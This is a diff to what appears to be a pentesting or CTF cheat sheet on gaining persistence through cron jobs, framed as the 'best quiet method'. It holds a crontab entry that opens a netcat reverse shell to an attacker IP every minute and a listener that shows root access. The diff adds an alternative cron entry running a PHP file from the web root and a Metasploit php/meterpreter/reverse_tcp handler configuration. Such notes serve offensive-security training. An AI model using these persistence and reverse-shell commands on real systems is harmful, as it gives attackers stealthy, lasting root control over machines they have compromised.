@@ -86,12 +86,13 @@ msf6 exploit(multi/handler) > run
 meterpreter >  whoami
 
 
-(Technique 5) Setup Persistance w/ cronjobs
+(Technique 5) Setup Persistance w/ cronjobs (Best quiet method)
 
 
 $ cat /etc/crontab
 $ crontab -e
      - add * * * * * nc 10.10.10.10. 1234 -e /bin/bash
+     - or add php -f /var/www/html/backup.php
 $ crontab -l                                            #(see the installation)
 
 
@@ -99,6 +100,13 @@ $ nc -nvlp 1234
       - id
       - uid=0(root)
 
+#(or)
+
+msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.10.10.10
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > run
+  - Started reverse TCP ...
 
 
 
